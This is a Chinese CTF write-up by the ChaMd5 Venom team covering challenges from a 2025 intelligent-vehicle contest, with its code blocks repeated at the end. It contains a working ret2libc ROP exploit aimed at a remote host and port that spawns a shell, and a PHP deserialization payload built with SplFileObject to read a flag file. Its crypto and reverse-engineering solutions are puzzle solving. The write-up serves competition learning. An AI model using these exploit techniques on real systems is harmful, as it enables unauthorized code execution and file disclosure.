# 首届CCF智能汽车大赛(CCF IVC 2025) Mini-Venom(第一名)

> 原文: https://www.ctfiot.com/263528.html
> ID: 263528

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

Pwn:

pwn-3

发现很明显的一个溢出，并且给了write函数用来泄露地址

通过write函数泄露libc地址，之后打ret2libc即可

from gt import *
con("amd64")

# io = process("./rop")
io = remote("124.133.253.44",33046)
libc =ELF("./libc-2.27.so")

write_plt = 0x400450
write_got = 0x601018

pop_rdi = 0x0000000000400643#: pop rdi; ret; 
pop_rsi = 0x0000000000400641#: pop rsi; pop r15; ret;

payload = b'a'*0x88+p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)

# gdb.attach(io)
io.sendline(payload)

io.recvuntil("x50")
io.recvuntil("x50")
libc_base = u64(io.recv(7).rjust(8,b'x00'))
libc_base = libc_base + 0x50 - libc.sym["write"]
suc("libc_base",libc_base)

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search("/bin/sh"))

payload = b'a'*0x88+p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)

io.interactive()

flag{70c6a4340c6c5bb3b0b34a8caa9a872f}

Web:

easylogin

访问/?source=1得到源码，并且抓包中可以找到hash值，直接进行hash长度扩展

接下来进行解码然后转换成base64

加上新hash用.号分隔提交token得到flag

serp

git源码泄露

//posts.php
<?php
class Post {
    public $title;
    public $content;
    publicfunction __construct($title, $content) {
        $this->title = $title;
        $this->content = $content;
    }
    publicfunction __toString() {
        return$this->title . "/" . $this->content;
    }
}
class Maker {
    public $model = "Post";
    public $args = ["Title", "Contents"];
    protected $obj = null;
    publicfunction __construct($model, $args){
        $this->model = $model;
        $this->args = $args;
    }
    publicfunction getInstance() {
        if($this->obj == null) {
            $this->obj = new$this->model(...$this->args);
        }
        return$this->obj;
    }
    publicfunction __toString() {
        return"object(". $this->model ."){" . strval($this->getInstance()) . "}";
    }
    publicfunction __destruct() {
        $this->obj = null;
    }
}

//index.php
<?php
include("./posts.php");
$posts = [new Post("test", "test")];
$posts = unserialize(strval($_COOKIE["posts"]));

if($_POST["post"]){
    $post = (new Maker("Post", $_POST["post"]))->getInstance();
    $posts[] = $post;
    setcookie("posts", serialize($posts));  
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Center</title>
    <link rel="stylesheet" href="bulma.min.css">
</head>


    <nav class="navbar">
        
        
                UserCenter
            
        
    </nav>
    <sectionclass="section">
        
            
                
                    <formmethod="POST" action="/?add">
                        
                        <textareaclass="textarea" name="post[]"/></textarea>
            Send
                    </form>
            <hr>
            <?phpforeach($postsas $post): ?>
            
                <h3><?= $post->title; ?></h3>
                <?= $post->content; ?>
            
            <?phpendforeach; ?>
                
                
                    <h5class="has-text-light">buildbygit</h5>
                    
                    <?phpforeach(scandir(".") as $d): ?>
                    <?= strval($d); ?>
                    <?phpendforeach; ?>
                    
                
            
        
    </section>



</html>

利用页面隐藏的目录列表功能来查看当前目录下的文件

结合posts.php来读取flag的文件内容，根据这篇文章https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0

<?php
class Post {
    public $title;
    public $content;
    publicfunction __construct(string $title) {
        $this->title = $title;
    }
    publicfunction setContent($content) {
        $this->content = $content;
        return$this;
    }
}

class Maker {
    public $model;
    public $args;
    protected $obj = null;
    publicfunction __construct(string $model, array $args) {
        $this->model = $model;
        $this->args = $args;
    }
}

$a = new Maker('SplFileObject', ['f1a9.php', 'r']);
$b = (new Post('test'))->setContent($a);
$c = [$b];
echo urlencode(serialize($c));

修改cookie，查看源代码得到flag

Crypto:

Curve

题目基于Diffie-Hellman和二元二次不定方程pell方程，首先观察Add函数发现不是常规的曲线方程，而是形如

的点对，符合pell方程解的（x,y）解的特征，那么这个方程为，先恢复，随便取两点然后移项得到，求gcd得到p的近似值，但是发现p不是素数，我们可以在sieve_base中取几个小素数试除，当p为素数时我们就成功恢复模数了

因为D是平方根，属于非平凡的pell方程，我们由如下的

我们有

因为不满足曲线上的运算，因此我们将映射到上，将ECDLP简化成DLP，然后将值重新映射回曲线上

from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes, sieve_base
import gmpy2

D = 841
G = (1100598635269059922265259097431205826869659019985617812588900225256796699368319232, 269583433230904539404618502954816143916504972586573484672290485092817854594102981)
A = (522493413431164541763578890114416187756743905387601370337657937604705331138537817, 1508871699477090073528276437418263853138631109882880455850153282479682759269308568)
B = (775700026584506740810283787673112405277484661261929762130750879159326080315752049, 164554371563691962332379023518848094645187895772638009983860665200242350372953279)
C = bytes.fromhex("7727ceae1edbfa37f913e09b44c10e6fa846891f4b520c87d829fc55299b1f02621af77a1f1f1107d1159c4088250834")

gx, gy = G
ax, ay = A

kp1 = gx**2 - D * gy**2 - 1
kp2 = ax**2 - D * ay**2 - 1

    
p_approximate = int(gcd(kp1, kp2))
# print(isPrime(p_approximate))
for prime in sieve_base[:20]:
    if p_approximate % prime == 0:
        p = p_approximate // prime
        if isPrime(p):
            break
print(p)

F = GF(p)

d = F(gmpy2.iroot(D, 2)[0])
print(d)

pell_g = F(G[0]) + F(G[1]) * d
pell_a = F(A[0]) + F(A[1]) * d
pell_b = F(B[0]) + F(B[1]) * d

n_a = discrete_log(pell_a, pell_g)

share = pell_b ^ n_a
share_inv = share ^ (-1)
shared_secret = (share + share_inv) / F(2)

key = sha256(long_to_bytes(int(shared_secret))).digest()
cipher = AES.new(key, AES.MODE_ECB)
flag = cipher.decrypt(C)

print(flag)

nfsr

task
from Crypto.Cipher import AES
from Crypto.Util.number import *
from Crypto.Util.Padding import pad
from hashlib import sha512
from secret import flag

mask1 = 211151158277430590850506190902325379931
mask2 = 314024231732616562506949148198103849397
mask3 = 175840838278158851471916948124781906887
mask4 = 270726596087586267913580004170375666103

def lfsr(R, mask):
    R_bin = [int(b) for b in bin(R)[2:].zfill(128)]
    mask_bin = [int(b) for b in bin(mask)[2:].zfill(128)]
    s = sum([R_bin[i] * mask_bin[i] for i in range(128)]) & 1
    R_bin = [s] + R_bin[:-1]
    return (int("".join(map(str, R_bin)), 2), s)

def ff(x0, x1, x2, x3):
    return (int(sha512(long_to_bytes(x0 * x2 + x0 + x1**4 + x3**5 + x0 * x1 * x2 * x3 + (x1 * x3) ** 4)).hexdigest(), 16) & 1)

def round(R, R1_mask, R2_mask, R3_mask, R4_mask):
    out = 0
    R1_NEW, _ = lfsr(R, R1_mask)
    R2_NEW, _ = lfsr(R, R2_mask)
    R3_NEW, _ = lfsr(R, R3_mask)
    R4_NEW, _ = lfsr(R, R4_mask)
    for _ in range(256):
        R1_NEW, x1 = lfsr(R1_NEW, R1_mask)
        R2_NEW, x2 = lfsr(R2_NEW, R2_mask)
        R3_NEW, x3 = lfsr(R3_NEW, R3_mask)
        R4_NEW, x4 = lfsr(R4_NEW, R4_mask)
        out = (out << 1) + ff(x1, x2, x3, x4)
    return out

key = getRandomNBitInteger(128)
out = round(key, mask1, mask2, mask3, mask4)
cipher = AES.new(long_to_bytes(key), mode=AES.MODE_ECB)
print(out)
print(cipher.encrypt(pad(flag, 16)))
# 68014145798558789680147296296059748493170180017159509061459191404846898978879
# b'x9cxafx89x98x90<xdfxe8xefxd7x06x9cxf1xb0x1c3xccx12xabxdcx0exfa/x1bx95xe8xd6xa9axe6x86"x18x86q|xfaxa6xf9xedxe7x80Gx16ax18x04xcb'

analysis

nfsr问题，但是根据题目提示以及task代码部分，先后对于单个的nfsr，单个的nfsr流密码生成的过程变得简单了些，但是约束条件进行了混淆。ff函数的相应功能。

针对于此，我们先进行了测试，打出一部分真值表进行比对。此后转化该函数为bool函数，这个时候为了获取得到关键数据key进行解密，task转化为获得其相应的二进制位。思路如下：

找到一个由式子x0 * x2 + x0 + x14 + x35 + x0 * x1 * x2 * x3 + (x1 * x3) ** 4得到的bool函数，使其乘积为0的时候得到相应的约束条件。如果out中某一位为1的时候，搜集这些等式的解。

由于相应的key的数据与循环次数并不相等的缘故，如果循环次数改为300次，则可以稳定预测该nfsr，针对于这道题，我们需要爆破部分内容。

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from gt import *
con("amd64")

# io = process("./rop")
io = remote("124.133.253.44",33046)
libc =ELF("./libc-2.27.so")

write_plt = 0x400450
write_got = 0x601018

pop_rdi = 0x0000000000400643#: pop rdi; ret; 
pop_rsi = 0x0000000000400641#: pop rsi; pop r15; ret;

payload = b'a'*0x88+p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)

# gdb.attach(io)
io.sendline(payload)

io.recvuntil("x50")
io.recvuntil("x50")
libc_base = u64(io.recv(7).rjust(8,b'x00'))
libc_base = libc_base + 0x50 - libc.sym["write"]
suc("libc_base",libc_base)

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search("/bin/sh"))

payload = b'a'*0x88+p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)

io.interactive()
//posts.php
<?php
class Post {
    public $title;
    public $content;
    publicfunction __construct($title, $content) {
        $this->title = $title;
        $this->content = $content;
    }
    publicfunction __toString() {
        return$this->title . "/" . $this->content;
    }
}
class Maker {
    public $model = "Post";
    public $args = ["Title", "Contents"];
    protected $obj = null;
    publicfunction __construct($model, $args){
        $this->model = $model;
        $this->args = $args;
    }
    publicfunction getInstance() {
        if($this->obj == null) {
            $this->obj = new$this->model(...$this->args);
        }
        return$this->obj;
    }
    publicfunction __toString() {
        return"object(". $this->model ."){" . strval($this->getInstance()) . "}";
    }
    publicfunction __destruct() {
        $this->obj = null;
    }
}
//index.php
<?php
include("./posts.php");
$posts = [new Post("test", "test")];
$posts = unserialize(strval($_COOKIE["posts"]));

if($_POST["post"]){
    $post = (new Maker("Post", $_POST["post"]))->getInstance();
    $posts[] = $post;
    setcookie("posts", serialize($posts));  
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Center</title>
    <link rel="stylesheet" href="bulma.min.css">
</head>


    <nav class="navbar">
        
        
                UserCenter
            
        
    </nav>
    <sectionclass="section">
        
            
                
                    <formmethod="POST" action="/?add">
                        
                        <textareaclass="textarea" name="post[]"/></textarea>
            Send
                    </form>
            <hr>
            <?phpforeach($postsas $post): ?>
            
                <h3><?= $post->title; ?></h3>
                <?= $post->content; ?>
            
            <?phpendforeach; ?>
                
                
                    <h5class="has-text-light">buildbygit</h5>
                    
                    <?phpforeach(scandir(".") as $d): ?>
                    <?= strval($d); ?>
                    <?phpendforeach; ?>
                    
                
            
        
    </section>



</html>
<?php
class Post {
    public $title;
    public $content;
    publicfunction __construct(string $title) {
        $this->title = $title;
    }
    publicfunction setContent($content) {
        $this->content = $content;
        return$this;
    }
}

class Maker {
    public $model;
    public $args;
    protected $obj = null;
    publicfunction __construct(string $model, array $args) {
        $this->model = $model;
        $this->args = $args;
    }
}

$a = new Maker('SplFileObject', ['f1a9.php', 'r']);
$b = (new Post('test'))->setContent($a);
$c = [$b];
echo urlencode(serialize($c));
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes, sieve_base
import gmpy2

D = 841
G = (1100598635269059922265259097431205826869659019985617812588900225256796699368319232, 269583433230904539404618502954816143916504972586573484672290485092817854594102981)
A = (522493413431164541763578890114416187756743905387601370337657937604705331138537817, 1508871699477090073528276437418263853138631109882880455850153282479682759269308568)
B = (775700026584506740810283787673112405277484661261929762130750879159326080315752049, 164554371563691962332379023518848094645187895772638009983860665200242350372953279)
C = bytes.fromhex("7727ceae1edbfa37f913e09b44c10e6fa846891f4b520c87d829fc55299b1f02621af77a1f1f1107d1159c4088250834")

gx, gy = G
ax, ay = A

kp1 = gx**2 - D * gy**2 - 1
kp2 = ax**2 - D * ay**2 - 1

    
p_approximate = int(gcd(kp1, kp2))
# print(isPrime(p_approximate))
for prime in sieve_base[:20]:
    if p_approximate % prime == 0:
        p = p_approximate // prime
        if isPrime(p):
            break
print(p)

F = GF(p)

d = F(gmpy2.iroot(D, 2)[0])
print(d)

pell_g = F(G[0]) + F(G[1]) * d
pell_a = F(A[0]) + F(A[1]) * d
pell_b = F(B[0]) + F(B[1]) * d

n_a = discrete_log(pell_a, pell_g)

share = pell_b ^ n_a
share_inv = share ^ (-1)
shared_secret = (share + share_inv) / F(2)

key = sha256(long_to_bytes(int(shared_secret))).digest()
cipher = AES.new(key, AES.MODE_ECB)
flag = cipher.decrypt(C)

print(flag)
task
from Crypto.Cipher import AES
from Crypto.Util.number import *
from Crypto.Util.Padding import pad
from hashlib import sha512
from secret import flag

mask1 = 211151158277430590850506190902325379931
mask2 = 314024231732616562506949148198103849397
mask3 = 175840838278158851471916948124781906887
mask4 = 270726596087586267913580004170375666103

def lfsr(R, mask):
    R_bin = [int(b) for b in bin(R)[2:].zfill(128)]
    mask_bin = [int(b) for b in bin(mask)[2:].zfill(128)]
    s = sum([R_bin[i] * mask_bin[i] for i in range(128)]) & 1
    R_bin = [s] + R_bin[:-1]
    return (int("".join(map(str, R_bin)), 2), s)

def ff(x0, x1, x2, x3):
    return (int(sha512(long_to_bytes(x0 * x2 + x0 + x1**4 + x3**5 + x0 * x1 * x2 * x3 + (x1 * x3) ** 4)).hexdigest(), 16) & 1)

def round(R, R1_mask, R2_mask, R3_mask, R4_mask):
    out = 0
    R1_NEW, _ = lfsr(R, R1_mask)
    R2_NEW, _ = lfsr(R, R2_mask)
    R3_NEW, _ = lfsr(R, R3_mask)
    R4_NEW, _ = lfsr(R, R4_mask)
    for _ in range(256):
        R1_NEW, x1 = lfsr(R1_NEW, R1_mask)
        R2_NEW, x2 = lfsr(R2_NEW, R2_mask)
        R3_NEW, x3 = lfsr(R3_NEW, R3_mask)
        R4_NEW, x4 = lfsr(R4_NEW, R4_mask)
        out = (out << 1) + ff(x1, x2, x3, x4)
    return out

key = getRandomNBitInteger(128)
out = round(key, mask1, mask2, mask3, mask4)
cipher = AES.new(long_to_bytes(key), mode=AES.MODE_ECB)
print(out)
print(cipher.encrypt(pad(flag, 16)))
# 68014145798558789680147296296059748493170180017159509061459191404846898978879
# b'x9cxafx89x98x90<xdfxe8xefxd7x06x9cxf1xb0x1c3xccx12xabxdcx0exfa/x1bx95xe8xd6xa9axe6x86"x18x86q|xfaxa6xf9xedxe7x80Gx16ax18x04xcb'
test
from Crypto.Cipher import AES
from Crypto.Util.number import *
from Crypto.Util.Padding import pad
from hashlib import sha512

flag = b'flag{hello_test_flag}'

mask1 = 211151158277430590850506190902325379931
mask2 = 314024231732616562506949148198103849397
mask3 = 175840838278158851471916948124781906887
mask4 = 270726596087586267913580004170375666103

def lfsr(R, mask):
    R_bin = [int(b) for b in bin(R)[2:].zfill(128)]
    mask_bin = [int(b) for b in bin(mask)[2:].zfill(128)]
    s = sum([R_bin[i] * mask_bin[i] for i in range(128)]) & 1
    R_bin = [s] + R_bin[:-1]
    return (int("".join(map(str, R_bin)), 2), s)

def ff(x0, x1, x2, x3):
    return (int(sha512(long_to_bytes(x0 * x2 + x0 + x1**4 + x3**5 + x0 * x1 * x2 * x3 + (x1 * x3) ** 4)).hexdigest(), 16) & 1)

def round(R, R1_mask, R2_mask, R3_mask, R4_mask):
    out = 0
    R1_NEW, _ = lfsr(R, R1_mask)
    R2_NEW, _ = lfsr(R, R2_mask)
    R3_NEW, _ = lfsr(R, R3_mask)
    R4_NEW, _ = lfsr(R, R4_mask)
    for _ in range(256):
        R1_NEW, x1 = lfsr(R1_NEW, R1_mask)
        R2_NEW, x2 = lfsr(R2_NEW, R2_mask)
        R3_NEW, x3 = lfsr(R3_NEW, R3_mask)
        R4_NEW, x4 = lfsr(R4_NEW, R4_mask)
        temp = ff(x1, x2, x3, x4)
        print(temp, end = "t")
        if _ % 10 == 0and _ != 0:
            print()
        out = (out << 1) + temp
    return out

print()
key = getRandomNBitInteger(128)
out = round(key, mask1, mask2, mask3, mask4)
cipher = AES.new(long_to_bytes(key), mode=AES.MODE_ECB)
print(out)
print(cipher.encrypt(pad(flag, 16)))
# 68014145798558789680147296296059748493170180017159509061459191404846898978879
# b'x9cxafx89x98x90<xdfxe8xefxd7x06x9cxf1xb0x1c3xccx12xabxdcx0exfa/x1bx95xe8xd6xa9axe6x86"x18x86q|xfaxa6xf9xedxe7x80Gx16ax18x04xcb'
exp
from Crypto.Util.number import *
from hashlib import sha512
from Crypto.Cipher import AES
from sage.all import *

mask1 = 211151158277430590850506190902325379931
mask2 = 314024231732616562506949148198103849397
mask3 = 175840838278158851471916948124781906887
mask4 = 270726596087586267913580004170375666103
out = 68014145798558789680147296296059748493170180017159509061459191404846898978879
c = b'x9cxafx89x98x90<xdfxe8xefxd7x06x9cxf1xb0x1c3xccx12xabxdcx0exfa/x1bx95xe8xd6xa9axe6x86"x18x86q|xfaxa6xf9xedxe7x80Gx16ax18x04xcb'

def trans(mask):
    mask_bin = bin(mask)[2:].zfill(128)
    mat = Matrix(Zmod(2), 128, 128)
    for i in range(127):
        mat[i + 1, i] = 1
    for i in range(128):
        mat[0, i] = int(mask_bin[i])
    return mat

LFSR1, LFSR2, LFSR3, LFSR4 = trans(mask1), trans(mask2), trans(mask3), trans(mask4)
out = bin(out)[2:].zfill(256)

L = []
for i in range(len(out)):
    if(out[i] == "1"):
        L.append((LFSR1 ** (i + 2) + LFSR2 ** (i + 2) + LFSR4 ** (i + 2))[0])
L = Matrix(Zmod(2), L)
M = L.solve_right(vector(Zmod(2), [1for i in range(out.count("1"))]))
sol = list(L.right_kernel().basis())

for i in range(len(sol)):
    k = M + L.right_kernel().basis()[i]
    k = int("".join(map(str,k)), 2)
    cipher = AES.new(long_to_bytes(k), mode = AES.MODE_ECB)
    print(cipher.decrypt(c))
# flag{41fe9100-0ac8-4869-9193-69a5a047c060}
n67175170 = 0x4010302;
  n50594305 = 0x3040201;
  n84017411 = 0x5020103;
  n16974340 = 0x1030204;

do
  {
    *(n16 + v1) = __ROL1__(*(n16 + v1), 4);
    *(n16 + v1 + 1) = __ROL1__(*(n16 + v1 + 1), 4);
    *(n16 + v1 + 2) = __ROL1__(*(n16 + v1 + 2), 4);
    *(n16 + v1 + 3) = __ROL1__(*(n16 + v1 + 3), 4);
    n16 += 4;
  }
while ( n16 < 16 );
for ( i = 0; i < 16; i += 4 )
  {
    *(i + v1) ^= *(i + v1 + 1);
    v4 = *(i + v1 + 2);
    *(i + v1 + 1) ^= v4;
    v5 = *(i + v1 + 3) ^ v4;
    *(i + v1 + 3) ^= *(i + v1);
    *(i + v1 + 2) = v5;
  }

  n13 = 13;
  n96 = 96;
  n96_1 = 96;
  v7 = v1 - &v32;
  v44 = v1 - &v32;
  v40 = &v32 - v1;
  v41 = &v33 - v1;
  v42 = &v35[-v1 - 1];
  v43 = &v35[-v1];

do
  {
    for ( j = 0; j < 16; j += 4 )
    {
      *(j + v1) = byte_140003290[*(j + v1)];
      *(j + v1 + 1) = byte_140003290[*(j + v1 + 1)];
      *(j + v1 + 2) = byte_140003290[*(j + v1 + 2)];
      *(j + v1 + 3) = byte_140003290[*(j + v1 + 3)];
    }
    for ( k = 0; k < 16; k += 4 )
    {
      *(k + v1) ^= *(k + v1 + 1);
      v10 = *(k + v1 + 2);
      *(k + v1 + 1) ^= v10;
      v11 = *(k + v1 + 3) ^ v10;
      *(k + v1 + 3) ^= *(k + v1);
      *(k + v1 + 2) = v11;
    }
    n96_2 = n96;
    n4 = 4;
    n96_3 = n96;
    v13 = &v32;
    do
    {
      v14 = v13;
      n4_1 = 4;
      do
      {
        n4_2 = 0;
        v16 = &v14[n96_2];
        v17 = 0;
        do
        {
          v18 = 0;
          for ( m = 0; m < 32; ++m )
          {
            if ( ((*v16 >> m) & 1) != 0 )
            {
              v20 = v13[n4_2 + v7];
              if ( m )
              {
                m_1 = m;
                do
                {
                  v22 = v20;
                  v23 = 2 * v20;
                  v20 = (2 * v20) ^ 0x11B;
                  if ( v22 >= 0 )
                    v20 = v23;
                  --m_1;
                }
                while ( m_1 );
              }
              v18 ^= v20;
            }
          }
          v17 ^= v18;
          ++n4_2;
          v16 += 4;
        }
        while ( n4_2 < 4 );
        n96_2 = n96_3;
        *v14++ = v17;
        --n4_1;
      }
      while ( n4_1 );
      n96_2 = n96_3 - 4;
      v13 += 4;
      v24 = n4-- == 1;
      n96_3 -= 4;
    }
    while ( !v24 );
    v25 = v38;
    n4_3 = 4;
    v27 = v40;
    v28 = v41;
    do
    {
      *v25 = v25[v27];
      v25[1] = v28[v25];
      v25 += 4;
      *(v25 - 2) = v25[v42 - 4];
      *(v25 - 1) = v25[v43 - 4];
      --n4_3;
    }
    while ( n4_3 );
    v7 = v44;
    n16_1 = 0;
    v1 = v38;
    do
    {
      *(n16_1 + v1) = __ROL1__(*(n16_1 + v1), 4);
      *(n16_1 + v1 + 1) = __ROL1__(*(n16_1 + v1 + 1), 4);
      *(n16_1 + v1 + 2) = __ROL1__(*(n16_1 + v1 + 2), 4);
      result = __ROL1__(*(n16_1 + v1 + 3), 4);
      *(n16_1 + v1 + 3) = result;
      n16_1 += 4;
    }
    while ( n16_1 < 16 );
    v24 = n13-- == 1;
    n96 = n96_1;
  }
while ( !v24 );
return result;
}
    #include <stdio.h>
    #include <stdint.h>
    #include <string.h>

// 目标32字节常量
constuint8_t TARGET[32] = {
    0xAC, 0xDD, 0xAA, 0xE0, 0x25, 0x78, 0xE6, 0xB9, 0xCF, 0x40, 0x83, 0xD3, 0x4E, 0x7A, 0xCE, 0xEA,
    0xDD, 0xDC, 0x68, 0x3E, 0xDE, 0xC5, 0x24, 0x67, 0xAE, 0x47, 0x27, 0x27, 0x4D, 0x84, 0xA5, 0x5B};

// S盒
constuint8_t SBOX[256] = {
    0xC3, 0x4C, 0xED, 0x91, 0x73, 0xE6, 0xA5, 0x86, 0x44, 0xA9, 0xEE, 0x00, 0x75, 0x67, 0x5C, 0x04,
    0xDB, 0xDC, 0x9F, 0x20, 0x94, 0x78, 0x68, 0x80, 0x63, 0x12, 0x39, 0x54, 0x57, 0x5A, 0x24, 0x65,
    0x77, 0x23, 0xF0, 0x42, 0x4A, 0x7B, 0xB2, 0xE4, 0xB1, 0x59, 0x35, 0xF8, 0x6E, 0x4D, 0xCE, 0xFB,
    0x87, 0xC4, 0x6A, 0xE1, 0x7D, 0x3F, 0x9B, 0xAC, 0xC0, 0xAD, 0xA4, 0x9C, 0xFE, 0x51, 0xBD, 0xA1,
    0x45, 0xB6, 0x16, 0xF1, 0x25, 0xEA, 0x0E, 0x74, 0x48, 0x22, 0x2E, 0x61, 0xCC, 0x84, 0xAF, 0xA2,
    0x47, 0x8B, 0x07, 0x34, 0x93, 0x52, 0x7F, 0x8A, 0x0C, 0xB4, 0xE8, 0x3A, 0xFD, 0xEF, 0x40, 0xBE,
    0x14, 0x5D, 0x2C, 0xE9, 0x79, 0xD2, 0xF6, 0x81, 0x05, 0xE3, 0x1D, 0xAB, 0xB7, 0x50, 0x02, 0x11,
    0xCB, 0x08, 0xC5, 0x8D, 0xC7, 0xBC, 0x46, 0x92, 0x4E, 0xDE, 0x60, 0x90, 0xE7, 0x1F, 0xCD, 0x17,
    0xD0, 0xFC, 0x41, 0xD7, 0xA7, 0x3D, 0x0D, 0x21, 0xD6, 0x6F, 0x03, 0xA3, 0xEB, 0x9E, 0xBB, 0x33,
    0x19, 0xC9, 0x6C, 0x0F, 0x72, 0xCA, 0x2A, 0x83, 0xF5, 0xEC, 0x98, 0xA8, 0xE5, 0xAA, 0x37, 0x88,
    0x7A, 0xF2, 0x4B, 0x9A, 0xBF, 0xD3, 0x5E, 0x66, 0xD1, 0xB0, 0x4F, 0xA6, 0x96, 0x0B, 0x85, 0xE2,
    0xCF, 0xFA, 0xD9, 0x55, 0xF3, 0x1A, 0x8E, 0xAE, 0x82, 0xD5, 0x8C, 0x9D, 0xDD, 0x36, 0x64, 0x13,
    0x09, 0x10, 0x97, 0xC8, 0x18, 0x15, 0x89, 0x3B, 0xF9, 0x99, 0x29, 0x32, 0xF4, 0xFF, 0x0A, 0x3C,
    0x71, 0x1B, 0x1C, 0x2B, 0x7E, 0xC1, 0x62, 0x06, 0x7C, 0x2F, 0x6D, 0x76, 0xD8, 0x01, 0x38, 0x5B,
    0x27, 0x69, 0xDA, 0x5F, 0x43, 0x3E, 0xC6, 0x1E, 0xF7, 0x56, 0x28, 0xB8, 0xA0, 0xBA, 0xB3, 0x30,
    0x49, 0xB5, 0x31, 0xDF, 0x70, 0xE0, 0x95, 0x26, 0x58, 0xB9, 0x2D, 0x53, 0xD4, 0xC2, 0x6B, 0x8F};

// 列混淆矩阵
constuint8_t M[4][4] = {
    {0x02, 0x03, 0x01, 0x04},
    {0x01, 0x02, 0x04, 0x03},
    {0x03, 0x01, 0x02, 0x05},
    {0x04, 0x02, 0x03, 0x01}};

// 创建逆S盒
void create_inv_sbox(uint8_t inv_sbox[256])
{
    for (int i = 0; i < 256; i++)
    {
        inv_sbox[SBOX[i]] = i;
    }
}

// 4位循环左移（nibble交换）
uint8_t rol4(uint8_t x)
{
    return ((x << 4) & 0xF0) | (x >> 4);
}

// mix4函数
void mix4(uint8_t a, uint8_t b, uint8_t c, uint8_t d,
          uint8_t *ap, uint8_t *bp, uint8_t *cp, uint8_t *dp)
{
    *ap = a ^ b;
    *bp = b ^ c;
    *cp = d ^ c;
    *dp = d ^ *ap;
}

// invmix4函数
void invmix4(uint8_t ap, uint8_t bp, uint8_t cp, uint8_t dp,
             uint8_t *a, uint8_t *b, uint8_t *c, uint8_t *d)
{
    *c = cp ^ dp ^ ap;
    *b = bp ^ cp ^ dp ^ ap;
    *a = bp ^ cp ^ dp;
    *d = dp ^ ap;
}

// GF(2^8)乘法
uint8_t gf_mul(uint8_t a, uint8_t b)
{
    uint8_t res = 0;
    for (int i = 0; i < 8; i++)
    {
        if (b & 1)
            res ^= a;
        uint8_t carry = a & 0x80;
        a = (a << 1) ^ (carry ? 0x1B : 0);
        b >>= 1;
    }
    return res;
}

// GF(2^8)求逆
uint8_t gf_inv(uint8_t x)
{
    if (x == 0)
        return0; // 处理除零情况
    for (int y = 1; y < 256; y++)
    {
        if (gf_mul(x, y) == 1)
        {
            return y;
        }
    }
    return0; // 不应该到达这里
}

// 4x4矩阵与行向量相乘
void gf_mat_mul4_rowvec(const uint8_t v[4], const uint8_t M[4][4], uint8_t result[4])
{
    for (int j = 0; j < 4; j++)
    {
        result[j] = gf_mul(v[0], M[0][j]) ^ gf_mul(v[1], M[1][j]) ^
                    gf_mul(v[2], M[2][j]) ^ gf_mul(v[3], M[3][j]);
    }
}

// 4x4矩阵求逆（使用高斯-约旦消元法）
void gf_mat_inv4(const uint8_t M[4][4], uint8_t Minv[4][4])
{
    // 增广矩阵 [M|I]
    uint8_t A[4][8];

    // 初始化增广矩阵
    for (int i = 0; i < 4; i++)
    {
        for (int j = 0; j < 4; j++)
        {
            A[i][j] = M[i][j];
            A[i][j + 4] = (i == j) ? 1 : 0;
        }
    }

    // 高斯-约旦消元
    for (int c = 0; c < 4; c++)
    {
        // 寻找主元
        int pivot = -1;
        for (int i = c; i < 4; i++)
        {
            if (A[i][c] != 0)
            {
                pivot = i;
                break;
            }
        }

        // 交换行
        if (pivot != c)
        {
            for (int j = 0; j < 8; j++)
            {
                uint8_t temp = A[c][j];
                A[c][j] = A[pivot][j];
                A[pivot][j] = temp;
            }
        }

        // 将主元变为1
        uint8_t inv = gf_inv(A[c][c]);
        for (int j = 0; j < 8; j++)
        {
            A[c][j] = gf_mul(A[c][j], inv);
        }

        // 消元
        for (int i = 0; i < 4; i++)
        {
            if (i == c)
                continue;
            uint8_t factor = A[i][c];
            if (factor != 0)
            {
                for (int j = 0; j < 8; j++)
                {
                    A[i][j] ^= gf_mul(A[c][j], factor);
                }
            }
        }
    }

    // 提取逆矩阵
    for (int i = 0; i < 4; i++)
    {
        for (int j = 0; j < 4; j++)
        {
            Minv[i][j] = A[i][j + 4];
        }
    }
}

// 解密一个16字节块
void F_decrypt_block(const uint8_t block16[16], uint8_t result[16])
{
    uint8_t inv_sbox[256];
    uint8_t Minv[4][4];
    uint8_t st[16];

    // 创建逆S盒和逆矩阵
    create_inv_sbox(inv_sbox);
    gf_mat_inv4(M, Minv);

    // 复制输入
    memcpy(st, block16, 16);

    // 13次逆轮：ROL4 -> M^{-1} -> invmix4 -> invSbox
    for (int round = 0; round < 13; round++)
    {
        // ROL4
        for (int i = 0; i < 16; i++)
        {
            st[i] = rol4(st[i]);
        }

        // 矩阵变换
        uint8_t temp[16];
        for (int off = 0; off < 16; off += 4)
        {
            gf_mat_mul4_rowvec(&st[off], Minv, &temp[off]);
        }
        memcpy(st, temp, 16);

        // invmix4
        for (int off = 0; off < 16; off += 4)
        {
            uint8_t a, b, c, d;
            invmix4(st[off], st[off + 1], st[off + 2], st[off + 3], &a, &b, &c, &d);
            st[off] = a;
            st[off + 1] = b;
            st[off + 2] = c;
            st[off + 3] = d;
        }

        // 逆S盒
        for (int i = 0; i < 16; i++)
        {
            st[i] = inv_sbox[st[i]];
        }
    }

    // 撤销预处理：invmix4 -> ROL4
    for (int off = 0; off < 16; off += 4)
    {
        uint8_t a, b, c, d;
